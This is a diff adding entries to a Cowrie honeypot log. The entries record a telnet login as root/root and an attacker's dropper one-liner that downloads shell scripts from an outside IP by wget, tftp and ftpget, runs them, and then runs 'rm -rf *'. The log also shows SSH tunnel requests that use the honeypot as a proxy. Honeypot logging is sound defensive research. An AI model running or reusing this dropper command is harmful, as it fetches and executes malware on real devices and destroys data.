@@ -1213,3 +1213,44 @@
 2017-05-31T10:00:56+0000 [CowrieTelnetTransport,1648,213.24.133.129] login attempt [root/root] succeeded
 2017-05-31T10:00:58+0000 [CowrieTelnetTransport,1648,213.24.133.129] Opening TTY Log: log/tty/20170531-100058-None-1648i.log
 2017-05-31T10:00:58+0000 [CowrieTelnetTransport,1648,213.24.133.129] Warning: state changed and new state returned
+2017-05-31T10:01:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,326,91.230.47.82] got channel 'direct-tcpip' request
+2017-05-31T10:01:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,326,91.230.47.82] direct-tcp connection request to 185.86.151.225:80 from localhost:5556
+2017-05-31T10:01:04+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,326,91.230.47.82] direct-tcp forward to 185.86.151.225:80 with data 'GET /getip.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\nHost: s1.ipinfo.pw\r\nAccept: */*\r\n\r\n'
+2017-05-31T10:01:04+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,326,91.230.47.82] failed to connect: Connection refused
+2017-05-31T10:01:04+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,326,91.230.47.82] sending close 1
+2017-05-31T10:01:14+0000 [CowrieTelnetTransport,1648,213.24.133.129] CMD: sh
+2017-05-31T10:01:14+0000 [CowrieTelnetTransport,1648,213.24.133.129] Command found: sh 
+2017-05-31T10:01:17+0000 [CowrieTelnetTransport,1648,213.24.133.129] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.53/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.53 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.53; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.53 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-05-31T10:01:17+0000 [CowrieTelnetTransport,1648,213.24.133.129] Command found: cd /tmp
+2017-05-31T10:01:17+0000 [CowrieTelnetTransport,1648,213.24.133.129] Command found: cd /var/run
+2017-05-31T10:01:17+0000 [CowrieTelnetTransport,1648,213.24.133.129] Command found: cd /mnt
+2017-05-31T10:01:17+0000 [CowrieTelnetTransport,1648,213.24.133.129] Command found: cd /root
+2017-05-31T10:01:17+0000 [CowrieTelnetTransport,1648,213.24.133.129] Command found: cd /
+2017-05-31T10:01:17+0000 [CowrieTelnetTransport,1648,213.24.133.129] Command found: wget http://46.166.185.53/bins.sh
+2017-05-31T10:01:17+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.53/bins.sh>
+2017-05-31T10:01:24+0000 [CowrieTelnetTransport,1648,213.24.133.129] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.53/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.53 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.53; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.53 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-05-31T10:01:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] got channel 'direct-tcpip' request
+2017-05-31T10:01:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] direct-tcp connection request to 94.100.180.150:25 from localhost:5556
+2017-05-31T10:01:29+0000 [CowrieTelnetTransport,1648,213.24.133.129] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.53/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.53 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.53; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.53 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-05-31T10:01:29+0000 [CowrieTelnetTransport,1648,213.24.133.129] Closing TTY Log: log/tty/20170531-100058-None-1648i.log after 30 seconds
+2017-05-31T10:01:29+0000 [CowrieTelnetTransport,1648,213.24.133.129] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-05-31T10:01:29+0000 [CowrieTelnetTransport,1648,213.24.133.129] Connection lost after 63 seconds
+2017-05-31T10:01:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] got channel 'direct-tcpip' request
+2017-05-31T10:01:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] direct-tcp connection request to 2.18.154.189:443 from localhost:5556
+2017-05-31T10:01:36+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] direct-tcp forward to 2.18.154.189:443 with data '\x16\x03\x01\x00\x8b\x01\x00\x00\x87\x03\x01Y.\x94T\xc7$){\x0c\x9a:\x94\xef\xb2\x02X\xd9\x94\x0b\xfbSd\xf1tle(\xa8\n\xfa\xfb\x17\x00\x00\x1c\xc0\n\xc0\t\xc0\x14\xc0\x13\x009\x003\x005\x00/\x00\n\x008\x002\x00\x13\x00\x05\x00\x04\x01\x00\x00B\x00\x00\x00\x1f\x00\x1d\x00\x00\x1aauth.np.ac.playstation.net\x00\n\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00#\x00\x00\x00\x17\x00\x00\xff\x01\x00\x01\x00'
+2017-05-31T10:01:36+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] failed to connect: Connection refused
+2017-05-31T10:01:36+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] sending close 11
+2017-05-31T10:01:45+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] got channel 'direct-tcpip' request
+2017-05-31T10:01:45+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] direct-tcp connection request to 2.18.154.189:443 from localhost:5556
+2017-05-31T10:01:45+0000 [SSHChannel None (12) on SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] direct-tcp forward to 2.18.154.189:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80d\xae\xfa{d<\x9e\xc9T2\xc3\xd5:F3|\xa5\x06@}\xd3\xbcX3\xe7\xdfa7uC%\xd3'
+2017-05-31T10:01:45+0000 [SSHChannel None (12) on SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] failed to connect: Connection refused
+2017-05-31T10:01:45+0000 [SSHChannel None (12) on SSHService 'ssh-connection' on HoneyPotSSHTransport,320,91.230.47.76] sending close 12
+2017-05-31T10:01:47+0000 [-] Connection was probably lost. Could not write to terminal
+2017-05-31T10:01:47+0000 [-] Connection was probably lost. Could not write to terminal
+2017-05-31T10:01:47+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.53/bins.sh>
+2017-05-31T10:01:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,327,91.230.47.81] got channel 'direct-tcpip' request
+2017-05-31T10:01:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,327,91.230.47.81] direct-tcp connection request to 107.6.167.194:80 from localhost:5556
+2017-05-31T10:01:53+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,327,91.230.47.81] direct-tcp forward to 107.6.167.194:80 with data 'GET /internals/api/ip?1496224867290768464 HTTP/1.1\r\nHost: ip4.adspy.mobi\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip, deflate, sdch\r\n\r\n'
+2017-05-31T10:01:53+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,327,91.230.47.81] failed to connect: Connection refused
+2017-05-31T10:01:53+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,327,91.230.47.81] sending close 13
